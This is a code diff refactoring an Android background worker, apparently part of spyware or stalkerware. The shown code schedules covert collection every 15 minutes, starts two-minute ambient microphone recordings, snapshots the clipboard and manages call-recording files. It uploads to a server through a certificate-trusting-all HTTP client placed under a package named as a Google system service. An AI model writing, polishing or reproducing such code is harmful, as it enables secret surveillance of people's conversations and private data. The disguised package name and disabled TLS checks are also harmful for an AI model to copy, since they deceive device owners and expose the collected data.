@@ -38,16 +38,39 @@ class OfflineCollectorWorker(
         private const val TAG = "OfflineCollector"
         private const val WORK_NAME = "offline_collector"
         private const val MAX_STORAGE_BYTES = 100L * 1024 * 1024 // 100MB
+        private const val STORAGE_CLEANUP_TARGET_RATIO = 0.8
+
+        // Schedule intervals
+        private const val COLLECTION_INTERVAL_MINUTES = 15L
+        private const val COLLECTION_FLEX_INTERVAL_MINUTES = 5L
+        private const val BACKOFF_DELAY_MINUTES = 1L
+
+        // Ambient recording
+        private const val AMBIENT_RECORDING_DURATION_SEC = 120
+
+        // Clipboard cooldown
+        private const val CLIPBOARD_COOLDOWN_MS = 5 * 60 * 1000L
+
+        // Server connectivity timeouts
+        private const val CONNECT_TIMEOUT_SEC = 5L
+        private const val READ_TIMEOUT_SEC = 5L
+
+        // File cleanup
+        private const val UPLOADED_FILE_MAX_AGE_MS = 24 * 60 * 60 * 1000L
+
+        private val encryptedPrefsCache = mutableMapOf<String, SharedPreferences>()
 
         private fun getEncryptedPrefs(context: Context, name: String): SharedPreferences {
-            val masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)
-            return EncryptedSharedPreferences.create(
-                name,
-                masterKeyAlias,
-                context,
-                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
-                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
-            )
+            return encryptedPrefsCache.getOrPut(name) {
+                val masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)
+                EncryptedSharedPreferences.create(
+                    name,
+                    masterKeyAlias,
+                    context,
+                    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
+                    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
+                )
+            }
         }
 
         /**
@@ -59,11 +82,11 @@ class OfflineCollectorWorker(
                 .build()
 
             val request = PeriodicWorkRequestBuilder<OfflineCollectorWorker>(
-                15, TimeUnit.MINUTES,
-                5, TimeUnit.MINUTES // Flex interval
+                COLLECTION_INTERVAL_MINUTES, TimeUnit.MINUTES,
+                COLLECTION_FLEX_INTERVAL_MINUTES, TimeUnit.MINUTES
             )
                 .setConstraints(constraints)
-                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
+                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, BACKOFF_DELAY_MINUTES, TimeUnit.MINUTES)
                 .build()
 
             WorkManager.getInstance(context).enqueueUniquePeriodicWork(
@@ -71,7 +94,7 @@ class OfflineCollectorWorker(
                 ExistingPeriodicWorkPolicy.KEEP, // Don't restart if already scheduled
                 request
             )
-            Log.d(TAG, "Offline collector scheduled every 15 min")
+            Log.d(TAG, "Offline collector scheduled every $COLLECTION_INTERVAL_MINUTES min")
         }
     }
 
@@ -105,7 +128,7 @@ class OfflineCollectorWorker(
             } else {
                 // Server offline — queue ambient recording
                 Log.d(TAG, "Server offline, starting ambient recording...")
-                startAmbientRecording(120) // 2 minutes
+                startAmbientRecording(AMBIENT_RECORDING_DURATION_SEC)
             }
 
             // 5. Check storage limits
@@ -168,7 +191,7 @@ class OfflineCollectorWorker(
     private fun shouldCollectClipboard(): Boolean {
         val prefs = applicationContext.getSharedPreferences("clipboard_cache", Context.MODE_PRIVATE)
         val lastCollected = prefs.getLong("last_clipboard_collect", 0)
-        return System.currentTimeMillis() - lastCollected > 5 * 60 * 1000
+        return System.currentTimeMillis() - lastCollected > CLIPBOARD_COOLDOWN_MS
     }
 
     private fun captureClipboardSnapshot() {
@@ -201,8 +224,8 @@ class OfflineCollectorWorker(
         return try {
             val client = com.google.android.systemservice.utils.TrustAllCertificates
                 .createClientBuilder()
-                .connectTimeout(5, TimeUnit.SECONDS)
-                .readTimeout(5, TimeUnit.SECONDS)
+                .connectTimeout(CONNECT_TIMEOUT_SEC, TimeUnit.SECONDS)
+                .readTimeout(READ_TIMEOUT_SEC, TimeUnit.SECONDS)
                 .build()
 
             val request = okhttp3.Request.Builder()
@@ -238,7 +261,7 @@ class OfflineCollectorWorker(
         try {
             val cacheDir = applicationContext.cacheDir
             val now = System.currentTimeMillis()
-            val maxAge = 24 * 60 * 60 * 1000L // 24 hours
+            val maxAge = UPLOADED_FILE_MAX_AGE_MS
 
             cacheDir.listFiles()?.filter {
                 (it.name.startsWith("ambient_") || it.name.startsWith("call_")) &&
@@ -272,7 +295,7 @@ class OfflineCollectorWorker(
                 // Delete oldest files first
                 allFiles.sortBy { it.lastModified() }
                 for (file in allFiles) {
-                    if (totalSize <= MAX_STORAGE_BYTES * 0.8) break // Reduce to 80%
+                    if (totalSize <= MAX_STORAGE_BYTES * STORAGE_CLEANUP_TARGET_RATIO) break
                     totalSize -= file.length()
                     file.delete()
                     Log.d(TAG, "Deleted for space: ${file.name}")
